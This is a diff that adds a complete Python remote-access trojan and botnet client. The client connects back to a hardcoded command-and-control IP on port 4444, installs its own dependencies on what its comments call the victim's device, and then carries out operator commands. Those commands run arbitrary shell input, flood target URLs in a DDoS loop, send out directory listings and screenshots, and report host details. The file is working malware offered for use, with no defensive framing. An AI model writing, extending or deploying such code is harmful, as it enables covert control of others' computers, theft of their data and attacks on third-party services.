@@ -1,0 +1,154 @@
+import socket
+import threading
+import subprocess
+import os
+import time
+import platform
+import requests
+import random
+from io import BytesIO # for ss
+from PIL import ImageGrab   # type: ignore 
+import sys
+import base64 # for ss
+
+
+SERVER_IP = "85.234.135.196" #vps/dedi server ip the c2 code is hosted on
+SERVER_PORT = 4444 # keep this
+
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
+   # useragents go here
+]
+
+def install(package): # from here
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+try:
+    import requests
+except ImportError:
+    install("requests")
+    import requests
+
+try:
+    from PIL import ImageGrab # type: ignore
+except ImportError:
+    install("pillow")
+    from PIL import ImageGrab # type: ignore
+
+current_dir = os.path.expanduser("~") #to here leave this this ensures that when this code is ran on the victims device it checks if they have everything
+                                      #installed if not it installed it for them to ensure program works
+def format_tree(path, prefix=""):
+    """Returns a tree-style string of files and folders in the current directory."""
+    items = os.listdir(path)
+    tree_str = ""
+    for i, item in enumerate(items):
+        full_path = os.path.join(path, item)
+        connector = "└── " if i == len(items) - 1 else "├── "
+        tree_str += f"{prefix}{connector}{item}\n"
+        if os.path.isdir(full_path):
+            extension = "    " if i == len(items) - 1 else "│   "
+            try:
+                tree_str += format_tree(full_path, prefix + extension)
+            except:
+                pass
+    return tree_str
+
+def capture_screenshot():
+    """Capture screen and return base64 bytes."""
+    try:
+        img = ImageGrab.grab()
+        with BytesIO() as buf:
+            img.save(buf, format="PNG")
+            return base64.b64encode(buf.getvalue())
+    except Exception as e:
+        return None
+
+def handle_commands(s):
+    global current_dir
+    while True:
+        try:
+            data = s.recv(4096).decode()
+            if not data:
+                break
+
+            if data.startswith("/message"):
+                message = data[len("/message"):].strip()
+                print(f"\n[Message from C2]: {message}\n")
+
+            elif data.startswith("/run"):
+                cmd = data[len("/run"):].strip()
+                try:
+                    output = subprocess.getoutput(cmd)
+                except Exception as e:
+                    output = f"Error: {e}"
+                s.send(f"[Output] {output}".encode())
+
+            elif data.startswith("/ddos"):
+                try:
+                    _, url, reqs, duration = data.split()
+                    reqs = int(reqs)
+                    duration = int(duration)
+                except:
+                    continue
+                end_time = time.time() + duration
+                while time.time() < end_time:
+                    headers = {"User-Agent": random.choice(USER_AGENTS)}
+                    for _ in range(reqs):
+                        try:
+                            requests.get(url, headers=headers, timeout=5)
+                        except:
+                            pass
+                    time.sleep(0.1)
+
+            elif data.startswith("/files"):
+                try:
+                    tree = format_tree(current_dir)
+                    s.send(f"[Files in {current_dir}]:\n{tree}".encode())
+                except Exception as e:
+                    s.send(f"[Error listing files]: {e}".encode())
+
+            elif data.startswith("/cd "):
+                new_dir = data[len("/cd "):].strip()
+                target_dir = os.path.join(current_dir, new_dir)
+                if os.path.isdir(target_dir):
+                    current_dir = os.path.abspath(target_dir)
+                    s.send(f"[Changed directory to] {current_dir}".encode())
+                else:
+                    s.send(f"[Directory not found] {target_dir}".encode())
+
+            elif data.startswith("/back"):
+                current_dir = os.path.abspath(os.path.join(current_dir, ".."))
+                s.send(f"[Back to] {current_dir}".encode())
+
+            elif data.startswith("/ss"):
+                screenshot = capture_screenshot()
+                if screenshot:
+                    s.send(screenshot)
+                else:
+                    s.send(b"[screenshot_error] Failed to capture screenshot")
+
+            elif data.startswith("/info"):
+                info = f"""
+Hostname: {platform.node()}
+System: {platform.system()} {platform.release()}
+Architecture: {platform.machine()}
+Current Dir: {current_dir}
+"""
+                s.send(info.encode())
+
+        except:
+            break
+
+def keep_connected():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((SERVER_IP, SERVER_PORT))
+            hostname = platform.node()
+            s.send(hostname.encode())
+            handle_commands(s)
+        except:
+            time.sleep(1)
+
+if __name__ == "__main__":
+    keep_connected()
